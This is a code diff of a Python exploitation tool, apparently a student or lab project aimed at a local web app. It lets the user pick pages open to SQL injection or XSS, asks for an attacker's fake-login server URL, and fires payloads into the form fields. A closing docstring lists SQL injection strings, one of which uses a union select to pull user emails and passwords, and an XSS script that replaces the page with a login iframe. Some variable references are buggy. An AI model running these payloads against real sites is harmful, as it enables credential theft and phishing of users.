@@ -1,41 +1,129 @@
-import sys 
-from vuln_page import VulnPage
+import sys, json, copy, requests
+from vuln_page import VulnPage, POST_REQ, GET_REQ
 
 #this will be a method and login will be a parameter that's the url 
 
-def getInput(login, vulnerabilities, session=None):
-	print("Please select the pages you would like to exploit:\n")
-	print("{:<5} {:<10} {:<30} {:<20}".format(Number, "Pages", "URL", "Vulnerabilities"))
+def get_input(data, input_str, invalid_str):
+	while True:
+		bad_input = False
+		choices = input(input_str)
+		choices = [int(x) for x in choices.split()]
+		for x in choices:
+			if x > len(data) - 1 or x < 0:
+				print(invalid_str)
+				bad_input = True
+				break 
+		if bad_input:
+			continue 
+		else: 
+			break
+	return choices
+
+def get_payload_missing_info(exploit, add_info=None):
+	if exploit["name"] == "exploit_1":
+		url = input("Please enter the attacker's server's URL that creates a fake login page (including http://): ")
+		param = input("Please enter the param name that the get request takes for the login page: ")
+		return url.strip() + "?" + param.strip() + "=" + add_info.strip()
+	elif exploit["name"] == "exploit_2":
+		url = input("Please enter the url you would like to redirect to: ")
+		return url.strip() 
+
+
+def hack(login, vulnerabilities, session=None):
+	with open("exploits.json", 'r') as in_file:
+		exploits = json.load(in_file)
+
+	print()
+	print("{:<5} {:<10} {:<40} {:<20}".format("Num", "Pages", "URL", "Vulnerabilities"))
 	for x in range(len(vulnerabilities)):
 		page = vulnerabilities[x]
-		print("{:<5} {:<10} {:<30} {:<20}".format(x, page.name, page.url, page.pprint_vuln()))
+		print("{:<5} {:<10} {:<40} {:<20}".format(x, page.name, page.url, page.pprint_vuln()))
 	print()
-	print("List the number")
+
+	choices = get_input(vulnerabilities, "List the number of the pages you want to exploit (space separated): ", "Invalid input. A number is out of range of the available choices!")
+	choices = list(set(choices))
+
+	for choice in choices:
+		selected_page = vulnerabilities[choice]
+		vulns = selected_page.vuln
+
+		print()
+		print("Currently selected page: {}. Here are the available options:\n".format(selected_page.name))
+		print("{:<5} {:<10}".format("Num", "Vulnerability"))
+		for x in range(len(vulns)):
+			vuln = vulns[x]
+			print("{:<5} {:<10}".format(x, vuln))
+		print()
+
+		choice = get_input(page.vuln, "Please select a vulnerability to exploit: ", "Invalid input!")
+		while(len(choice) != 1):
+			print("More than 1 vulnerability selected. Please select only 1 vulnerability!")
+			choice = get_input(page.vuln, "Please select a vulnerability to exploit: ", "Invalid input!")
+		selected_vuln = vulns[choice[0]]
+
+		print()
+		print("Vulnerability selected: {}. Here are the available exploits:\n".format(selected_vuln))
+		print("{:<5} {:<10} {:<30}".format("Num", "Name", "Description", ))
+		for x in range(len(exploits[selected_vuln])):
+			exploit = exploits[selected_vuln][x]
+			print("{:<5} {:<10} {:<30}".format(x, exploit["name"], exploit["desc"]))
+		print()
+
+		choice = get_input(exploits[vuln], "Please select an exploit to run: ", "Invalid input!")
+		while(len(choice) != 1):
+			print("More than 1 exploit selected. Please select only 1 exploit!")
+			choice = get_input(page.vuln, "Please select an exploit to run: ", "Invalid input!")
+		selected_exploit = exploits[vuln][choice[0]]
+
+		print()
+		print("Exploit selected: {}\n".format(selected_exploit["name"]))
+		payload = selected_exploit["payload"]
+		if "[CHANGE_THIS]" in payload:
+			if selected_vuln == "XSS":
+				url = get_payload_missing_info(selected_exploit, add_info=login)
+				payload = payload.replace("[CHANGE_THIS]", url)
+		print()
+
+		print(payload)
+		print("Sending in customized payload now!")
+
+		data = selected_page.get_data()
+		for x in data.keys():
+			data[x] = payload
+
+		if session:
+			controller = session
+		else:
+			controller = requests
+
+		if selected_page.req_type == GET_REQ:
+			resp = controller.get(selected_page.url, params=data)
+		else:
+			resp = controller.post(selected_page.url, data=data)
+
+		with open("test_" + str(choice) + ".html", 'w') as out_file:
+			out_file.write(resp.text)
+
+		test = input("Continue to next page?")
 
 	
 
 if __name__ == "__main__":
-	def_list = [VulnPage("login", "/login", ["SQL"], {"username": "", "password": ""}),
-				VulnPage("movies", "/movies", ["SQL"], None),
-				VulnPage("forum", "/forum", ["XSS"], {"body":""})]
+	def_list = [VulnPage("login", "http://127.0.0.1:5000/login", ["SQL"], {"username": "", "password": ""}, POST_REQ),
+				VulnPage("movies", "http://127.0.0.1:5000/movies", ["SQL"], {"search" : ""}, GET_REQ),
+				VulnPage("forum", "http://127.0.0.1:5000/forum", ["XSS"], {"body":""}, POST_REQ)]
 
-	getInput(None, def_list)
+	session = requests.Session()
+	data = {"email" : "a@b", "password": "ab", 'security_level': 0, 'form': 'submit'}
+	session.post("http://127.0.0.1:5000/login", data=data)
+	
+	hack("http://127.0.0.1:5000/login", def_list, session=session)
 
 
 """
 blah' or '1'='1' --
 blah' or '1'='1' union select first_name, last_name, email, id, password from user --
 
-<script> 
-document.body.innerHTML = '';
-var iFrame = document.createElement('iframe');
-var html = '<body>Foo</body>';
-iFrame.frameBorder = "0";
-iFrame.src = '/login';
-iFrame.width  = window.innerWidth;
-iFrame.height = window.innerHeight;
-document.body.appendChild(iFrame);
-console.log('iFrame.contentWindow =', iFrame.contentWindow);
- </script>
+<script>document.body.innerHTML = '';var iFrame = document.createElement('iframe');var html = '<body>Foo</body>';iFrame.frameBorder = "0"; iFrame.src = '/login';iFrame.width  = window.innerWidth;iFrame.height = window.innerHeight;document.body.appendChild(iFrame);</script>
 
 """
